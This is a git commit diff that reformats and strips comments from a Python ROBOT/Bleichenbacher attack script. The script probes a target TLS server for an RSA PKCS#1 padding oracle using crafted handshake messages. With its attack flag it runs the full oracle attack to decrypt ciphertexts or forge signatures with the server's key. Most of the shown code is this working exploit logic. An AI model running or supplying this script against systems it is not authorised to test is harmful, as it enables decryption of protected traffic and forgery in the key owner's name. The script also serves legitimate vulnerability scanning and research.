7bc8ecc2abe41a744ad91dd3ad635070b9e428d3
Aaron Ma <aaronhma@gmail.com>
2019-05-21 15:47:39 -0700

    UPDATE: robot

--- system/robot/detect.py
+++ system/robot/detect.py
@@ -8,13 +8,19 @@ import ssl
 import gmpy2
 from cryptography import x509
 from cryptography.hazmat.backends import default_backend
-ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
-ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
-ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
+ch_def = bytearray.fromhex(
+    "16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
+ch_cbc = bytearray.fromhex(
+    "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
+ch_gcm = bytearray.fromhex(
+    "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
 ccs = bytearray.fromhex("000101")
-enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")
+enc = bytearray.fromhex(
+    "005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")
 MSG_FASTOPEN = 0x20000000
 EXECUTE_BLINDING = True
+
+
 def get_rsa_from_server(server, port):
     try:
         ctx = ssl.create_default_context()
@@ -32,7 +38,8 @@ def get_rsa_from_server(server, port):
     except ssl.SSLError as e:
         if not args.quiet:
             print("Cannot connect to server: %s" % e)
-            print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
+            print(
+                "Server does not seem to allow connections with TLS_RSA (this is ideal).")
         if args.csv:
             print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
         s.close()
@@ -44,6 +51,8 @@ def get_rsa_from_server(server, port):
         if args.csv:
             print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
         quit()
+
+
 def oracle(pms, messageflow=False):
     global cke_version
     try:
@@ -62,17 +71,13 @@ def oracle(pms, messageflow=False):
             while i + 5 > bend:
                 buf += s.recv(4096)
                 bend = len(buf)
-            # this is the record size
             psize = buf[i + 3] * 256 + buf[i + 4]
-            # if the size is 2, we received an alert
             if (psize == 2):
                 s.close()
                 return ("The server sends an Alert after ClientHello")
-            # try to read further record data
             while i + psize + 5 > bend:
                 buf += s.recv(4096)
                 bend = len(buf)
-            # check whether we have already received a ClientHelloDone
             if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                 break
             i += psize + 5
@@ -104,6 +109,8 @@ def oracle(pms, messageflow=False):
     except Exception as e:
         s.close()
         return str(e)
+
+
 def BleichenbacherOracle(cc):
     global count
     global countvalid
@@ -123,20 +130,29 @@ def BleichenbacherOracle(cc):
             return False
     else:
         return False
+
+
 parser = argparse.ArgumentParser(description="Bleichenbacher attack")
 parser.add_argument("host", help="Target host")
 group = parser.add_mutually_exclusive_group()
-group.add_argument("-r", "--raw", help="Message to sign or decrypt (raw hex bytes)")
+group.add_argument(
+    "-r", "--raw", help="Message to sign or decrypt (raw hex bytes)")
 group.add_argument("-m", "--message", help="Message to sign (text)")
-parser.add_argument("s0", nargs="?", default="1", help="Start for s0 value (default 1)")
-parser.add_argument("limit", nargs="?", default="-1", help="Start for limit value (default -1)")
-parser.add_argument("-a", "--attack", help="Try to attack if vulnerable", action="store_true")
-parser.add_argument("-p", "--port", metavar='int', default=443, help="TCP port")
+parser.add_argument("s0", nargs="?", default="1",
+                    help="Start for s0 value (default 1)")
+parser.add_argument("limit", nargs="?", default="-1",
+                    help="Start for limit value (default -1)")
+parser.add_argument(
+    "-a", "--attack", help="Try to attack if vulnerable", action="store_true")
+parser.add_argument("-p", "--port", metavar='int',
+                    default=443, help="TCP port")
 parser.add_argument("-t", "--timeout", default=5, help="Timeout")
 parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
 groupcipher = parser.add_mutually_exclusive_group()
-groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
-groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
+groupcipher.add_argument(
+    "--gcm", help="Use only GCM/AES256.", action="store_true")
+groupcipher.add_argument(
+    "--cbc", help="Use only CBC/AES128.", action="store_true")
 parser.add_argument("--csv", help="Output CSV format", action="store_true")
 args = parser.parse_args()
 
@@ -167,37 +183,35 @@ if not args.quiet:
     print("RSA N: %s" % hex(N))
     print("RSA e: %s" % hex(e))
     print("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))
-cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
+cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(
+    modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
 pad_len = (modulus_bytes - 48 - 3) * 2
 rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]
-
 rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
 pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
-# wrong first two bytes
 pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
-# 0x00 on a wrong position, also trigger older JSSE bug
 pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
-# no 0x00 in the middle
 pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
-# wrong version number (according to Klima / Pokorny / Rosa paper)
 pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)
-
-pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
-pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
-pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
-pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
-pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")
-
-
+pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(
+    modulus_bytes, byteorder="big")
+pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(
+    modulus_bytes, byteorder="big")
+pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(
+    modulus_bytes, byteorder="big")
+pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(
+    modulus_bytes, byteorder="big")
+pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(
+    modulus_bytes, byteorder="big")
 oracle_good = oracle(pms_good, messageflow=False)
 oracle_bad1 = oracle(pms_bad1, messageflow=False)
 oracle_bad2 = oracle(pms_bad2, messageflow=False)
 oracle_bad3 = oracle(pms_bad3, messageflow=False)
 oracle_bad4 = oracle(pms_bad4, messageflow=False)
-
 if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
     if not args.quiet:
-        print("Identical results (%s), retrying with changed messageflow" % oracle_good)
+        print("Identical results (%s), retrying with changed messageflow" %
+              oracle_good)
     oracle_good = oracle(pms_good, messageflow=True)
     oracle_bad1 = oracle(pms_bad1, messageflow=True)
     oracle_bad2 = oracle(pms_bad2, messageflow=True)
@@ -208,14 +222,13 @@ if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
             print("Identical results (%s), no working oracle found" % oracle_good)
             print("NOT VULNERABLE!")
         if args.csv:
-            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (
+                args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
         sys.exit(1)
     else:
         flow = True
 else:
     flow = False
-
-# Re-checking all oracles to avoid unreliable results
 oracle_good_verify = oracle(pms_good, messageflow=flow)
 oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
 oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
@@ -226,14 +239,9 @@ if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or
     if not args.quiet:
         print("Getting inconsistent results, aborting.")
     if args.csv:
-        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip,
+                                                        oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
     quit()
-
-# If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
-# requests starting with 0002, we have a weak oracle. This is because the only
-# case where we can distinguish valid from invalid requests is when we send
-# correctly formatted PKCS#1 message with 0x00 on a correct position. This
-# makes our oracle weak
 if (oracle_bad1 == oracle_bad2 == oracle_bad3):
     oracle_strength = "weak"
     if not args.quiet:
@@ -260,9 +268,11 @@ else:
     tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])
 
 if args.csv:
-    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver,
+                                                        oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
 else:
-    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
+    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" %
+          (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
 
 if not args.quiet:
     print("Result of good request:                        %s" % oracle_good)
@@ -271,7 +281,6 @@ if not args.quiet:
     print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
     print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)
 
-# Only continue if we want to attack
 if not args.attack:
     sys.exit(0)
 
@@ -286,11 +295,9 @@ else:
         print('No message given, will sign "This message was signed with a Bleichenbacher oracle."')
     else:
         msg = args.message
-    C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
+    C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" +
+            "".join("{:02x}".format(ord(c)) for c in msg), 16)
 
-
-################################################################################
-# define Bleichenbacher Oracle
 count = 0
 countvalid = 0
 
@@ -304,7 +311,7 @@ b = int(3 * B - 1)
 s0 = int(args.s0)
 limit = int(args.limit)
 c0 = C
-# Step 1: Blinding
+
 print("Searching for the first valid ciphertext starting %i" % s0)
 if (EXECUTE_BLINDING):
     while not BleichenbacherOracle(c0):
@@ -323,8 +330,6 @@ previntervalsize = 0
 i = 1
 while True:
 
-    # find pairs r,s such that m*s % N = m*s-r*N is PKCS conforming
-    # 2.a)
     if i == 1:
         s = N // (3 * B)
         cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
@@ -332,7 +337,6 @@ while True:
             s += 1
             cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
 
-    # 2.b)
     if not i == 1 and len(M) >= 2:
         s += 1
         cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
@@ -340,7 +344,6 @@ while True:
             s += 1
             cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
 
-    # 2.c)
     if not i == 1 and len(M) == 1:
         a, b = M.pop()
         M.add((a, b))
@@ -354,24 +357,17 @@ while True:
                 s = -(-(2 * B + r * N) // b)
             cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
 
-    # compute all possible r, depending on the known bounds on m.
-    # Use that 2*B+r*N <= ms <= 3*B-1+r*N
-    # is equivalent to (a*s-3*B-1)/N <= r <= (b*s-2*B)/N
-    # 3.
     for MM in M:
         a, b = MM
         rmax = (b * s - 2 * B) // N
         rmin = -(-(a * s - 3 * B - 1) // N)
-        # for all possible pairs (s,r) we obtain bounds
-        # (2*B+r*N)/s) <= m <= (3*B+1+r*N)/s) on m.
-        # Add bounds only if they make sense, i.e., if a < b.
+
         for r in range(rmin, rmax + 1):
             anew = (2 * B + r * N) // s
             bnew = -(-(3 * B + 1 + r * N) // s)
             if anew < bnew:
                 Mnew.add((anew, bnew))
 
-    # Keep only intervals which are compatible with previous intervals
     Mnext.clear()
     for MMnew in Mnew:
         anew, bnew = MMnew
@@ -414,6 +410,8 @@ if s0 != 1:
     print("result after unblinding: ", hex(res))
 
 stoptime = time.time()
-print("Time elapsed:", stoptime - starttime, "seconds (=", (stoptime - starttime) / 60, "minutes)")
-print("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About", (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
+print("Time elapsed:", stoptime - starttime,
+      "seconds (=", (stoptime - starttime) / 60, "minutes)")
+print("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About",
+      (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
 print(count, "oracle queries performed,", countvalid, "valid ciphertexts.")
